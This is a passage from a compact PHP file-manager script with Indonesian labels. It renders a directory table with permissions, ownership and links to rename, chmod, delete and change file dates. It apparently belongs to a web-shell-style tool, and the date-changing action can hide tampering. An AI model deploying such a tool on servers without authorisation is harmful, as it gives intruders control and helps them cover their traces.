...
<table class="table table-hover">
  ...
  <tbody>
';foreach($folders as $folder){$perms="0".substr(decoct(fileperms(PATH."/".$folder)),-3);$color_class=getPermsColorClass($perms,PATH."/".$folder);$owner_info='';if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$owner_id=fileowner(PATH."/".$folder);$group_id=filegroup(PATH."/".$folder);$owner=posix_getpwuid($owner_id);$group=posix_getgrgid($group_id);$owner_info=$owner['name'].'/'.$group['name'];}else{$owner_info=fileowner(PATH."/".$folder).'/'.filegroup(PATH."/".$folder);}echo "    <tr>\n      <td><i class='fa-solid fa-folder'></i> <a href='?p=".urlencode(encodePath(PATH."/".$folder))."'>".$folder."</a></td>\n      <td><b>---</b></td>\n      <td>".date("F d Y H:i:s",filemtime(PATH."/".$folder))."</td>\n      <td>".$owner_info."</td>
      <td><span class='{$color_class}'>".$perms."</span></td>\n      <td>\n        <div class='action-buttons'>\n            <a title='Ubah Tanggal' href='?q=".urlencode(encodePath(PATH))."&t=".urlencode($folder)."'><i class='fa-regular fa-calendar'></i></a>\n            <a title='Rename' href='?q=".urlencode(encodePath(PATH))."&r=".urlencode($folder)."'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>\n            <a title='Chmod' href='?q=".urlencode(encodePath(PATH))."&chmod=".urlencode($folder)."'><i class='fa-solid fa-key'></i></a>\n            <a title='Delete' href='?q=".urlencode(encodePath(PATH))."&d=".urlencode($folder)."' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta semua isinya?\")'><i class='fa fa-trash' aria-hidden='true'></i></a>\n        </div>\n      </td>\n    </tr>\n";}foreach($files as $file){$perms="0".substr(decoct(fileperms(PATH."/".$file)),-3);$color_class=getPermsColorClass($perms,PATH."/".$file);$ext=strtolower(fileExtension($file));$owner_info='';if(function_exists('posix_getpwuid')&&function_exists('posix_getgrgid')){$owner_id=fileowner(PATH."/".$file);$group_id=filegroup(PATH."/".$file);$owner=posix_getpwuid($owner_id);$group=posix_getgrgid($group_id);$owner_info=$owner['name'].'/'.$group['name'];}else{$owner_info=fileowner(PATH."/".$file).'/'.filegroup(PATH."/".$file);}$actions='
        <div class="action-buttons">
